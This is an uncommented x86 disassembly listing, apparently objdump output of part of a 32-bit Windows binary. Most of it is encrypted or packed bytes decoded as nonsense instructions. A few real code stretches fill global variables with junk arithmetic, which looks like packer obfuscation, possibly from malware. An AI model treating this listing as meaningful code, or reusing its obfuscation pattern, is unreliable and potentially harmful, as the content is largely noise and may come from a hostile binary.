  407b10:	fistp  DWORD PTR [eax-0x63d2ca33]
  407b16:	fs jge 0x407abf
  407b19:	dec    esi
  407b1a:	test   BYTE PTR [edi],dh
  407b1c:	or     bh,0xac
  407b1f:	mov    dh,0xdc
  407b21:	iret   
  407b22:	ja     0x407ada
  407b24:	data16 std 
  407b26:	fmul   QWORD PTR [edx-0x3f]
  407b29:	call   0xc83b:0x9ad8991c
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0xfdf6a3a4,al
  407ba8:	jg     0x407b2b
  407baa:	mov    esp,0x7e7ecb78
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b47
  407bb4:	pop    esp
  407bb5:	push   es
  407bb6:	icebp  
  407bb7:	push   edx
  407bb8:	ins    BYTE PTR es:[edi],dx
  407bb9:	neg    DWORD PTR [eax]
  407bbb:	out    dx,eax
  407bbc:	pop    ecx
  407bbd:	inc    ecx
  407bbe:	sub    ah,BYTE PTR [ebp-0x63]
  407bc1:	xchg   esp,eax
  407bc3:	jge    0x407be4
  407bc5:	retf   
  407bc6:	(bad)  
  407bc7:	stc    
  407bc8:	clc    
  407bc9:	enter  0x32a1,0xf8
  407bcd:	rcl    BYTE PTR [esp+edx*2-0x3e937704],cl
  407bd4:	cld    
  407bd5:	mov    al,ds:0x36a580e0
  407bda:	ds sahf 
  407bdc:	mov    edi,0x25e5a2e7
  407be1:	cmp    eax,0xa0bd82a3
  407be6:	jo     0x407b7f
  407be8:	ins    DWORD PTR es:[edi],dx
  407be9:	hlt    
  407bea:	or     DWORD PTR [esi-0xcc159a9],esp
  407bf0:	jae    0x407c4e
  407bf2:	mov    ch,0xe2
  407bf4:	ds pusha 
  407bf6:	(bad)  
  407bf7:	xlat   BYTE PTR ds:[ebx]
  407bf8:	or     dl,al
  407bfa:	mov    dh,0xb6
  407bfc:	sahf   
  407bfd:	ja     0x407bdb
  407bff:	fmul   QWORD PTR [esi+0x63]
  407c02:	js     0x407b9d
  407c04:	adc    DWORD PTR [eax-0x27],esp
  407c07:	jp     0x407bce
  407c09:	sti    
  407c0a:	push   ecx
  407c0b:	jmp    0x1e89:0xc3ce4730
  407c12:	jge    0x407c7e
  407c14:	in     al,0x3e
  407c16:	jb     0x407c67
  407c18:	fcmovnu st,st(7)
  407c1a:	jecxz  0x407c8c
  407c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c1d:	leave  
  407c1e:	xchg   bh,ah
  407c20:	stos   DWORD PTR es:[edi],eax
  407c21:	stos   BYTE PTR es:[edi],al
  407c22:	aas    
  407c23:	and    dh,cl
  407c25:	(bad)  
  407c26:	aad    0x57
  407c28:	pop    eax
  407c29:	fst    QWORD PTR [eax-0x28eeb59f]
  407c2f:	es loop 0x407c8b
  407c32:	inc    ebp
  407c33:	cdq    
  407c34:	addr16 call 0x5fb6:0xf3ad5cc4
  407c3c:	js     0x407cac
  407c3e:	pop    ebp
  407c3f:	pop    ecx
  407c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c41:	push   edi
  407c42:	call   FWORD PTR [ebx+ecx*4]
  407c45:	mov    fs,WORD PTR gs:[edx+0x3463c367]
  407c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4d:	pop    es
  407c4e:	xor    BYTE PTR [edi-0x6173e90e],cl
  407c54:	dec    esi
  407c55:	xor    bh,BYTE PTR [eax]
  407c57:	xor    eax,0x685d5e57
  407c5c:	dec    ecx
  407c5d:	cdq    
  407c5e:	or     dl,ah
  407c60:	sbb    ecx,ebx
  407c62:	xor    ch,BYTE PTR [ebp+0x5fe75c3b]
  407c68:	and    ebx,DWORD PTR [esi-0x5c5102b6]
  407c6e:	xor    dl,dh
  407c70:	dec    ecx
  407c71:	lods   al,BYTE PTR ds:[esi]
  407c72:	clc    
  407c73:	pop    ebx
  407c74:	in     al,dx
  407c75:	stc    
  407c76:	mov    ah,0x9
  407c78:	pop    ss
  407c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7a:	jge    0x407cf1
  407c7c:	fwait
  407c7d:	clc    
  407c7e:	sbb    eax,0x9c7c09b4
  407c83:	rcl    dl,1
  407c85:	mov    esi,DWORD PTR [eax]
  407c87:	jg     0x407c1b
  407c89:	pop    edx
  407c8a:	or     al,0xc8
  407c8c:	xor    ah,BYTE PTR [edx+0x6559f99a]
  407c92:	sub    edi,DWORD PTR [esi]
  407c94:	cmp    bl,bh
  407c96:	or     eax,0xaf071246
  407c9b:	imul   edx,edx,0x10
  407c9e:	stos   BYTE PTR es:[edi],al
  407c9f:	in     eax,0x49
  407ca1:	cmp    al,0xfc
  407ca3:	cld    
  407ca4:	in     al,0x5d
  407ca6:	fisubr DWORD PTR [eax]
  407ca8:	adc    eax,DWORD PTR [ebx-0x5ae2900e]
  407cae:	add    al,0x1b
  407cb0:	sti    
  407cb1:	push   0xde0a1d
  407cb6:	ret    
  407cb7:	or     eax,0xb3f2db36
  407cbc:	xchg   DWORD PTR [edi],eax
  407cbe:	jno    0x407c67
  407cc0:	mov    ecx,0x59fbafbb
  407cc5:	push   ds
  407cc6:	cmp    esp,eax
  407cc8:	into   
  407cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cca:	add    eax,0x4986cb09
  407ccf:	bound  edx,QWORD PTR [esi-0x30538de8]
  407cd5:	inc    edx
  407cd6:	(bad)  
  407cd8:	(bad)  
  407cd9:	popw   ss
  407cdb:	lahf   
  407cdc:	test   eax,0xf292dd86
  407ce1:	ja     0x407d47
  407ce3:	ss in  al,0xa8
  407ce6:	das    
  407ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce8:	xchg   edi,eax
  407ce9:	(bad)  
  407ceb:	xchg   edx,eax
  407cec:	inc    esp
  407ced:	xor    DWORD PTR [esi-0x59],0x72eb9c93
  407cf4:	mov    ss,esp
  407cf6:	fild   QWORD PTR [ecx]
  407cf8:	and    al,0xfc
  407cfa:	push   esp
  407cfb:	ficom  DWORD PTR [ecx-0xd928772]
  407d01:	mov    bl,0x72
  407d03:	mov    dl,0x3d
  407d05:	(bad)  
  407d06:	mov    ebp,0x154c966
  407d0b:	inc    esi
  407d0c:	cwde   
  407d0d:	loopne 0x407d68
  407d0f:	fcom   DWORD PTR [eax-0x17]
  407d12:	(bad)
  407d16:	jbe    0x407d08
  407d18:	add    DWORD PTR [ecx+0x542e447],ebp
  407d1e:	mov    DWORD PTR [ebp+edi*1-0x76],ecx
  407d22:	mov    bl,0x9d
  407d24:	int    0xd8
  407d26:	data16 in al,dx
  407d28:	and    DWORD PTR [ecx],0x39
  407d2b:	add    bh,BYTE PTR [eax-0x5a42ffea]
  407d31:	loop   0x407d8a
  407d33:	(bad)  
  407d34:	pop    eax
  407d35:	in     eax,dx
  407d36:	shr    BYTE PTR [ebx+0x7f],1
  407d39:	mov    eax,0x6a516738
  407d3e:	xchg   ebp,eax
  407d3f:	push   es
  407d40:	mov    bh,cl
  407d42:	inc    ebx
  407d43:	push   ecx
  407d44:	sbb    DWORD PTR [eax+edx*4],eax
  407d47:	pop    edx
  407d48:	iret   
  407d49:	dec    edi
  407d4a:	mov    ebx,0xe0d96632
  407d4f:	test   BYTE PTR [edx-0x427f3ab],dh
  407d55:	scas   al,BYTE PTR es:[edi]
  407d56:	shr    BYTE PTR [eax],cl
  407d58:	or     dl,ch
  407d5a:	push   0x7a429b0c
  407d5f:	mov    esp,0xd4276997
  407d64:	int    0xd0
  407d66:	addr16 loop 0x407cea
  407d69:	mov    BYTE PTR [edx],ah
  407d6b:	test   DWORD PTR [eax-0x46],esi
  407d6e:	(bad)  
  407d70:	xor    bl,cl
  407d72:	hlt    
  407d73:	icebp  
  407d74:	call   FWORD PTR [eax]
  407d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d77:	call   0xbeef:0x5c428420
  407d7e:	hlt    
  407d7f:	div    DWORD PTR [ecx+0x39526209]
  407d85:	xor    BYTE PTR [esi],0xcc
  407d88:	out    dx,al
  407d89:	push   esp
  407d8a:	or     al,0x9a
  407d8c:	xor    al,0x59
  407d8e:	adc    DWORD PTR [eax+esi*8-0x60782601],0x0
  407d96:	push   edi
  407d97:	not    BYTE PTR [ebp+0xd]
  407d9a:	scas   al,BYTE PTR es:[edi]
  407d9b:	push   ds
  407d9c:	in     eax,dx
  407d9d:	xor    al,0x2c
  407d9f:	cmp    BYTE PTR [ecx],ah
  407da1:	or     eax,0xa180dce0
  407da6:	dec    esp
  407da7:	mov    ebp,0xe492bc6a
  407dac:	enter  0xf760,0xb4
  407db0:	rcl    DWORD PTR [ebx-0x17f569d4],1
  407db6:	bound  eax,QWORD PTR [ebx+0x4f8178a8]
  407dbc:	sbb    edx,DWORD PTR [edi-0x72e5bb5c]
  407dc2:	or     al,0x0
  407dc4:	xor    dl,bh
  407dc6:	sub    eax,0x3d94dee0
  407dcb:	mov    edi,0x5310f531
  407dd0:	pop    ebp
  407dd1:	lds    ebx,FWORD PTR [edi]
  407dd3:	(bad)  
  407dd5:	mov    dl,0x24
  407dd7:	cmp    bl,BYTE PTR [edi+0x17bf7fce]
  407ddd:	mov    ch,0xe3
  407ddf:	data16 fild WORD PTR [edi]
  407de2:	mov    BYTE PTR [ebx-0x7b],dl
  407de5:	jmp    0x407e45
  407de7:	call   0xd214:0xfa00395b
  407dee:	inc    edi
  407def:	popf   
  407df0:	stc    
  407df1:	xor    al,0x64
  407df3:	xor    BYTE PTR ds:0xc3f8f74b,bl
  407df9:	ret    0xcd66
  407dfc:	add    bh,BYTE PTR [edx]
  407dfe:	aam    0x60
  407e00:	loope  0x407e74
  407e02:	cmp    DWORD PTR [ecx+esi*1+0xef8a0e0],ecx
  407e09:	adc    al,0x31
  407e0b:	sbb    al,0x81
  407e0d:	mov    eax,0x2536d2fe
  407e12:	popa   
  407e13:	arpl   WORD PTR [ebx],bp
  407e15:	add    BYTE PTR [esi],bh
  407e17:	xchg   ebx,eax
  407e18:	sti    
  407e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e1a:	push   ebx
  407e1b:	shl    BYTE PTR [esi-0x49],1
  407e1e:	jbe    0x407e81
  407e20:	(bad)  [ebp-0x6210a6df]
  407e26:	mov    eax,0xa78bb5b5
  407e2b:	in     al,0xb7
  407e2d:	xchg   esp,esp
  407e2f:	push   ebx
  407e30:	dec    ebp
  407e31:	scas   al,BYTE PTR es:[edi]
  407e32:	push   edi
  407e33:	xchg   esi,eax
  407e34:	xchg   edx,eax
  407e35:	push   ebx
  407e36:	mov    esp,0x49bf2d9b
  407e3b:	pop    ecx
  407e3c:	push   esp
  407e3d:	pushf  
  407e3e:	or     BYTE PTR [edx],al
  407e40:	push   edx
  407e41:	mov    esp,0x9ead4be9
  407e46:	mov    ah,0x4
  407e48:	fstp   TBYTE PTR ds:[edi]
  407e4b:	dec    ecx
  407e4c:	or     DWORD PTR [eax+0x11],ebx
  407e4f:	pop    edx
  407e50:	bound  ecx,QWORD PTR [edx]
  407e52:	push   cs
  407e53:	data16 jns 0x407e25
  407e56:	(bad)  
  407e57:	mov    cs,WORD PTR [edx*4-0x2a0960f1]
  407e5e:	outs   dx,DWORD PTR ds:[esi]
  407e5f:	push   esp
  407e60:	cmp    DWORD PTR [edx-0x8f1bc70],esi
  407e66:	aam    0xe0
  407e68:	ja     0x407e3f
  407e6a:	fisttp QWORD PTR [eax+eax*4]
  407e6d:	pop    ebp
  407e6e:	lock cmp eax,0xf4477dfe
  407e74:	push   ebp
  407e75:	mov    esi,0xfd7f9bd9
  407e7a:	jle    0x407e99
  407e7c:	fcomp  DWORD PTR [ebx+0x7e740369]
  407e82:	pop    edi
  407e83:	cmp    edi,ebp
  407e85:	arpl   bp,bx
  407e87:	repnz push esi
  407e89:	sbb    DWORD PTR [ebx-0x53],0xffffffb1
  407e8d:	mov    ch,BYTE PTR [ebp-0x4d]
  407e90:	leave  
  407e91:	stos   DWORD PTR es:[edi],eax
  407e92:	jecxz  0x407f03
  407e94:	push   eax
  407e95:	mov    esp,0x4665a2a2
  407e9a:	push   0x13
  407e9c:	sub    eax,0x36b8b748
  407ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea2:	cs popf 
  407ea4:	push   esi
  407ea5:	bound  edi,QWORD PTR [edi]
  407ea7:	dec    edi
  407ea8:	sbb    al,0xf4
  407eaa:	repnz inc ecx
  407eac:	jno    0x407e66
  407eae:	add    al,0x4d
  407eb0:	ror    DWORD PTR [esi-0x631eb8ac],cl
  407eb6:	inc    esi
  407eb7:	jecxz  0x407efe
  407eb9:	fnsave ds:0xfeb8d5
  407ebf:	int    0x37
  407ec1:	xor    DWORD PTR [ebx+0x16],esi
  407ec4:	imul   ebp,ebx,0xffffffb5
  407ec7:	outs   dx,BYTE PTR ds:[esi]
  407ec8:	mov    bl,0xb3
  407eca:	inc    eax
  407ecb:	dec    eax
  407ecc:	ror    BYTE PTR [eax+0x38],0x18
  407ed0:	lods   eax,DWORD PTR ds:[esi]
  407ed1:	or     al,0x67
  407ed3:	xor    BYTE PTR [edi],0x6d
  407ed6:	cmp    BYTE PTR [ebx],dh
  407ed8:	sub    BYTE PTR [esp+edi*4-0x11],0xb2
  407edd:	mov    bh,0x20
  407edf:	sbb    bh,ah
  407ee1:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  407ee8:	mov    ax,WORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	cs sti 
  407f1f:	add    al,0x2b
  407f21:	sub    dl,dh
  407f23:	jle    0x407fa3
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	and    eax,0xbc861578
  407f2e:	mov    eax,0x313be73a
  407f33:	sbb    ah,BYTE PTR [ebx-0x53d5c370]
  407f39:	ja     0x407f19
  407f3b:	fwait
  407f3c:	stos   BYTE PTR es:[edi],al
  407f3d:	mov    esi,0xe6f945fa
  407f42:	test   DWORD PTR [edi],0x82a36a93
  407f48:	inc    esi
  407f49:	out    dx,eax
  407f4a:	fst    DWORD PTR [ecx+ebp*2-0x2751addf]
  407f51:	cmp    eax,0xbcaa242
  407f56:	(bad)  
  407f57:	(bad)  
  407f58:	popf   
  407f59:	cli    
  407f5a:	xor    BYTE PTR [edi+0x5a7fa2ec],ah
  407f60:	and    edx,DWORD PTR [edi+0x4b]
  407f63:	fst    QWORD PTR [ebx]
  407f65:	xchg   ebx,eax
  407f66:	dec    eax
  407f67:	out    0x40,eax
  407f69:	adc    BYTE PTR [ecx],al
  407f6b:	xlat   BYTE PTR ds:[ebx]
  407f6c:	bound  ebx,QWORD PTR [ebp+0x343820f9]
  407f72:	call   0x23049389
  407f77:	sbb    ah,BYTE PTR [ebx-0x58b5a67f]
  407f7d:	mov    BYTE PTR [eax-0x3e],cl
  407f80:	mov    bh,0xb4
  407f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f83:	sbb    DWORD PTR [ebp+0x38],eax
  407f86:	loopne 0x407f82
  407f88:	xchg   esp,eax
  407f89:	pcmpgtb mm7,QWORD PTR [edx+eiz*4-0x545d07f0]
  407f91:	scas   eax,DWORD PTR es:[edi]
  407f92:	(bad)  
  407f93:	ja     0x407f47
  407f95:	xchg   edi,eax
  407f96:	jp     0x407fd8
  407f98:	test   dl,0x87
  407f9b:	clc    
  407f9c:	inc    eax
  407f9d:	dec    edi
  407f9e:	add    al,0xde
  407fa0:	ja     0x407f8e
  407fa2:	cs jmp 0x407fc0
  407fa5:	test   DWORD PTR [edx-0x49],ecx
  407fa8:	or     ch,bh
  407faa:	mov    fs,WORD PTR [eax]
  407fac:	test   ch,ch
  407fae:	xor    BYTE PTR [edi+0xe],dl
  407fb1:	outs   dx,DWORD PTR ds:[esi]
  407fb2:	(bad)  
  407fb3:	aas    
  407fb4:	es push eax
  407fb6:	test   al,0x3e
  407fb8:	popa   
  407fb9:	jb     0x407fbe
  407fbb:	jl     0x407f98
  407fbd:	lods   eax,DWORD PTR ds:[esi]
  407fbe:	loope  0x40800a
  407fc0:	ror    DWORD PTR [edi+0xf],1
  407fc3:	mov    ss,WORD PTR [eax-0x3e]
  407fc6:	mov    al,0x1e
  407fc8:	fucomi st,st(0)
  407fca:	dec    esp
  407fcb:	jb     0x407fdd
  407fcd:	imul   esi,DWORD PTR [eax+0x5d814ce8],0x2252434d
  407fd7:	dec    eax
  407fd8:	les    ebx,FWORD PTR [ecx-0x6c441a1d]
  407fde:	dec    ebx
  407fdf:	addr16 dec esp
  407fe1:	sub    bh,0x6e
  407fe4:	fcmovb st,st(5)
  407fe6:	inc    edx
  407fe7:	scas   al,BYTE PTR es:[edi]
  407fe8:	dec    esi
  407fe9:	or     al,0x4
  407feb:	xor    eax,ebx
  407fed:	test   eax,0x244a3f88
  407ff2:	loopne 0x407fa6
  407ff4:	iret   
  407ff5:	jnp    0x407fde
  407ff7:	push   esi
  407ff8:	pop    edi
  407ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ffa:	sub    DWORD PTR [ebp*8-0x50379e6f],edx
  408001:	mov    ds,WORD PTR ds:0x953d7df5
  408007:	jp     0x407fef
  408009:	sbb    bl,BYTE PTR [edx-0x4c]
  40800c:	mov    fs,WORD PTR [ecx-0x5d71559a]
  408012:	pop    es
  408013:	fidivr DWORD PTR [ebx-0xc]
  408016:	adc    eax,0x4b948ee7
  40801b:	push   0x10c99cbc
  408020:	(bad)  
  408021:	hlt    
  408022:	in     al,0x55
  408024:	jae    0x408083
  408026:	add    ah,BYTE PTR [ebx+0x38]
  408029:	test   BYTE PTR [edx+ecx*1],dl
  40802c:	scas   eax,DWORD PTR es:[edi]
  40802d:	call   0x5133c3d7
  408032:	jge    0x40807b
  408034:	pop    ebp
  408035:	addr16 sbb ebx,edi
  408038:	(bad)  
  40803a:	xchg   ebp,eax
  40803b:	jae    0x407fc2
  40803d:	push   esp
  40803e:	xor    bl,BYTE PTR [edx+0x36e4649d]
  408044:	push   ecx
  408045:	cld    
  408046:	mov    cl,0x41
  408048:	xor    eax,0x22b7c8e0
  40804d:	mov    dh,0x92
  40804f:	adc    BYTE PTR ss:[eax+0x145f09cb],dh
  408056:	mov    al,BYTE PTR [edx+ebp*2-0x44]
  40805a:	sti    
  40805b:	leave  
  40805c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40805d:	int3   
  40805e:	jmp    0x1afb546d
  408063:	xor    DWORD PTR [edx+0x59958dbb],0xfffffffd
  40806a:	out    0x8c,eax
  40806c:	call   DWORD PTR [edi+0x12db1874]
  408072:	jl     0x408040
  408074:	mov    BYTE PTR [ebx-0x11],bl
  408077:	dec    ebx
  408078:	repnz cwde 
  40807a:	fisubr DWORD PTR [eax+0x78]
  40807d:	jno    0x408033
  40807f:	and    al,0x3b
  408081:	add    bh,BYTE PTR [eax-0x38eb1853]
  408087:	aam    0xef
  408089:	je     0x408066
  40808b:	add    DWORD PTR [edi-0x1abb25c],esi
  408091:	mov    al,ds:0xf845c7af
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0xf0c7d38b
  40818c:	nop
  40818d:	nop
  40818e:	xlat   BYTE PTR ds:[ebx]
  40818f:	jle    0x40820f
  408191:	in     al,0x7f
  408193:	jle    0x408213
  408195:	data16 xlat BYTE PTR ds:[ebx]
  408197:	or     DWORD PTR [edx],esi
  408199:	cmp    al,0x6a
  40819b:	jg     0x4081e2
  40819d:	jmp    0x40813a
  40819f:	cmp    DWORD PTR [edx],esi
  4081a1:	mov    DWORD PTR [ebx],ebp
  4081a3:	cmc    
  4081a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081a5:	xor    bl,BYTE PTR [edi-0x64]
  4081a8:	xchg   ecx,eax
  4081a9:	mov    eax,0x7605d6
  4081ae:	loope  0x408210
  4081b0:	push   edi
  4081b1:	jmp    0x2659570f
  4081b6:	gs repz pop ecx
  4081b9:	jmp    0xc6a2de3e
  4081be:	cmp    BYTE PTR [ebx-0x7b6cdd58],bl
  4081c4:	or     ebp,DWORD PTR [ecx-0x62a9b159]
  4081ca:	push   esp
  4081cb:	pop    eax
  4081cc:	mov    ch,0xdf
  4081ce:	sahf   
  4081cf:	cmp    dh,BYTE PTR [edx+0x0]
  4081d2:	daa    
  4081d3:	repnz push edx
  4081d5:	loope  0x408198
  4081d7:	jne    0x40823e
  4081d9:	das    
  4081da:	mov    dh,0x75
  4081dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081dd:	add    al,0x94
  4081df:	pop    edi
  4081e0:	leave  
  4081e1:	sbb    ebx,eax
  4081e3:	sub    al,0x75
  4081e5:	outs   dx,DWORD PTR ds:[esi]
  4081e6:	mov    dl,0x9e
  4081e8:	imul   BYTE PTR [eax+0x6d]
  4081eb:	aas    
  4081ec:	sti    
  4081ed:	in     eax,dx
  4081ee:	leave  
  4081ef:	stc    
  4081f0:	xor    DWORD PTR [edi],edi
  4081f2:	aaa    
  4081f3:	dec    edi
  4081f4:	add    eax,0x19882290
  4081f9:	pop    edx
  4081fa:	call   0xa0e6:0x6cf691ca
  408201:	imul   edi,DWORD PTR [ebx-0x51],0xffffff84
  408205:	cmp    al,0xff
  408207:	mov    DWORD PTR [ebp+0x269e68eb],ebp
  40820d:	iret   
  40820e:	test   eax,0xfc3b7c3c
  408213:	sub    DWORD PTR [edi+0x12fc55cc],ecx
  408219:	and    ecx,ebp
  40821b:	outs   dx,DWORD PTR ds:[esi]
  40821c:	xchg   ecx,eax
  40821d:	(bad)  
  40821e:	loop   0x4081ad
  408220:	inc    esp
  408221:	outs   dx,BYTE PTR ds:[esi]
  408222:	jne    0x4081bf
  408224:	pop    ebp
  408225:	leave  
  408226:	cli    
  408227:	test   al,0x9a
  408229:	retf   0xcfae
  40822c:	pop    esp
  40822d:	jge    0x408283
  40822f:	xor    esi,DWORD PTR [edi]
  408231:	dec    edx
  408232:	xor    eax,edi
  408234:	push   esi
  408235:	mov    al,ds:0x2a1733f4
  40823a:	inc    ebp
  40823b:	cmp    BYTE PTR [eax+ebx*2+0x3b],al
  40823f:	cmp    esp,DWORD PTR [esi+0x5c]
  408242:	or     BYTE PTR [ecx+0x34],bl
  408245:	hlt    
  408246:	daa    
  408247:	sbb    DWORD PTR [esi+0x14bca65],esi
  40824d:	pop    esp
  40824e:	aaa    
  40824f:	sbb    DWORD PTR [esi+0x4612c677],0x43
  408256:	in     eax,0x5d
  408258:	pop    edx
  408259:	(bad)  
  40825a:	pop    esp
  40825b:	sub    eax,0x599440
  408260:	aam    0xbf
  408262:	das    
  408263:	jl     0x40827f
  408265:	sub    eax,DWORD PTR [esi+0xf]
  408268:	add    eax,0x39efa598
  40826d:	(bad)  
  40826e:	pop    ecx
  40826f:	std    
  408270:	mov    WORD PTR [ecx-0x32],es
  408273:	ja     0x408297
  408275:	sbb    ah,BYTE PTR [esi-0x45033d71]
  40827b:	(bad)  
  40827c:	daa    
  40827d:	sub    dh,ah
  40827f:	push   ebp
  408280:	(bad)  
  408283:	inc    ebx
  408284:	and    DWORD PTR [ecx],eax
  408286:	cs scas al,BYTE PTR es:[edi]
  408288:	or     DWORD PTR [eax],ecx
  40828a:	retf   
  40828b:	div    WORD PTR [ecx-0x7e892253]
  408292:	mov    ebp,0x830be000
  408297:	fnstenv [ecx+0x6b6e5cf4]
  40829d:	ins    BYTE PTR es:[edi],dx
  40829e:	mov    ebx,DWORD PTR [edx+0x1a]
  4082a1:	cmp    BYTE PTR [eax],dl
  4082a3:	lea    edi,[ebx-0x59]
  4082a6:	xchg   ecx,eax
  4082a7:	mov    ?,WORD PTR [ebp-0x692ecb63]
  4082ad:	jl     0x408276
  4082af:	mov    dh,bh
  4082b1:	out    0x7b,eax
  4082b3:	or     bh,dl
  4082b5:	sbb    al,0x84
  4082b7:	sub    al,0xdf
  4082b9:	jb     0x40829c
  4082bb:	sbb    DWORD PTR ds:0xfeadaa4,esi
  4082c1:	add    BYTE PTR [edi+esi*4-0x76],ch
  4082c5:	inc    edi
  4082c6:	mov    BYTE PTR [esi-0x5fe2541f],ch
  4082cc:	test   al,0xc0
  4082ce:	call   0x10eccc62
  4082d3:	clc    
  4082d4:	mov    dh,0xea
  4082d6:	and    BYTE PTR [ecx-0x30ba5f74],cl
  4082dc:	icebp  
  4082dd:	or     cl,dl
  4082df:	lds    edx,FWORD PTR [ecx-0x7c]
  4082e2:	sbb    eax,0x7d1d8cea
  4082e7:	mov    ebp,0xf1d2b8f0
  4082ec:	pusha  
  4082ed:	pop    es
  4082ee:	loop   0x408351
  4082f0:	test   DWORD PTR [edx+0x6421ac07],ecx
  4082f6:	mov    esi,0x629c49d6
  4082fb:	add    al,0xec
  4082fd:	add    DWORD PTR [esi],esi
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43377f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
